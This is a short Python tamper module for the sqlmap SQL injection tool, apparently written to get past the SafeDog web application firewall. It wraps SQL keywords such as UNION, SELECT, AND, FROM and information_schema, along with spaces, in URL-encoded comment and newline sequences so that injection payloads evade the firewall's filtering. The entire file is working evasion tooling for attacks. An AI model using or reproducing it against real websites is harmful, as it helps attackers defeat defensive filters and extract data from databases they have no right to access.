#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload,**kwargs):
    if payload:
		bypass_SafeDog_str = "--%0a%0a%23%0a"
		payload=payload.replace("UNION",bypass_SafeDog_str+"UNION"+bypass_SafeDog_str)
		payload=payload.replace("SELECT",bypass_SafeDog_str+"SELECT"+bypass_SafeDog_str)
		payload=payload.replace("AND",bypass_SafeDog_str+"AND"+bypass_SafeDog_str)
		payload=payload.replace("=",bypass_SafeDog_str+"="+bypass_SafeDog_str)
		payload=payload.replace(" ",bypass_SafeDog_str)
		payload=payload.replace("information_schema",bypass_SafeDog_str+"information_schema"+bypass_SafeDog_str)
		payload=payload.replace("FROM",bypass_SafeDog_str+"FROM"+bypass_SafeDog_str)
		print payload
    return payload
